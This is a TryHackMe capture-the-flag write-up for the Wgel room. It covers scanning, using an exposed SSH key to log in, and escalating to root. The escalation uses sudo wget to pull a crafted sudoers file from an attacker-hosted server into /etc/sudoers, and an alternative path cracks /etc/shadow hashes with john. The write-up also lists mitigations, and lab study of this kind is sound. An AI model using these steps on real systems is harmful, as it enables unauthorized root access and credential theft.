# Wgel CTF – TryHackMe Writeup

## Overview

This room demonstrates a complete penetration testing workflow including reconnaissance, enumeration, initial access, and privilege escalation. The objective is to obtain both user and root access on the target system.

---

## Information Gathering

### Nmap Scan

```bash
nmap -sC -sV -oN nmap.txt <TARGET_IP>
```

### Results

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH
80/tcp open  http    Apache httpd
```

### Analysis

* Port 22 (SSH): Remote login service
* Port 80 (HTTP): Web server, primary attack surface

---

## Enumeration

### Directory Bruteforce

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt
```

### Findings

```
/sitemap
/assets
/server-status (403 Forbidden)
```

---

### Web Exploration

Navigating to `/sitemap/` revealed accessible files and directories. Further inspection exposed sensitive information, including an SSH private key.

---

## Initial Access

### Extracting SSH Key

Saved the discovered private key locally:

```bash
nano id_rsa
chmod 600 id_rsa
```

---

### SSH Login

```bash
ssh -i id_rsa jessie@<TARGET_IP>
```

Successfully obtained shell access as user `jessie`.

---

## Post-Exploitation

### Verify Access

```bash
whoami
id
```

Confirmed low-privileged access.

---

## Privilege Escalation

### Sudo Permissions Check

```bash
sudo -l
```

### Output

```
User jessie may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/wget
```

---

### Exploiting wget (Privilege Escalation)

The `wget` binary can be abused to write arbitrary files as root.

#### Step 1: Create malicious file (on attacker machine)

```bash
echo "jessie ALL=(ALL:ALL) NOPASSWD: ALL" > sudoers
```

#### Step 2: Host the file

```bash
python3 -m http.server 9001
```

#### Step 3: Download as root on target

```bash
sudo wget http://<ATTACKER_IP>:9001/sudoers -O /etc/sudoers
```

#### Step 4: Gain root access

```bash
sudo su
```

Successfully escalated privileges to root.

---

## Alternative Method: Shadow Hash Cracking

During enumeration, access to `/etc/shadow` was obtained.

---

### Initial Attempt

```bash
john shadow
```

### Output

```
Warning: detected hash type "sha512crypt"
Crash recovery file is locked: /home/kali/.john/john.rec
```

---

### Issue

* Existing John session was running
* Lock file prevented execution

---

### Fix

```bash
ps aux | grep john
kill -9 4392
rm ~/.john/john.rec
```

---

### Attempt Using unshadow

```bash
unshadow passwd shadow > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

### Error

```
fopen: passwd: No such file or directory
No password hashes loaded
```

---

### Analysis

* `passwd` file missing
* `unshadow` requires both passwd and shadow

---

### Correct Approach

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt shadow
```

---

### Retrieve Password

```bash
john --show shadow
```

Recovered valid credentials and used them for privilege escalation.

---

## Flags

### User Flag

```
<USER_FLAG>
```

### Root Flag

```
<ROOT_FLAG>
```

---

## Vulnerabilities Identified

### 1. Exposed SSH Private Key

* Sensitive credential publicly accessible
* Allowed unauthorized SSH access

### 2. Misconfigured Sudo Permissions

* `wget` allowed as root without password
* Enabled arbitrary file write

### 3. Weak Password Policy

* Password hash cracked using wordlist
* Indicates poor credential security

---

## Mitigation

* Remove sensitive files from web directories
* Apply least privilege to sudo permissions
* Enforce strong password policies
* Restrict access to critical system files

---

## Conclusion

The system was fully compromised through exposed credentials and misconfigured privileges. Proper enumeration and exploitation techniques led to successful root access.
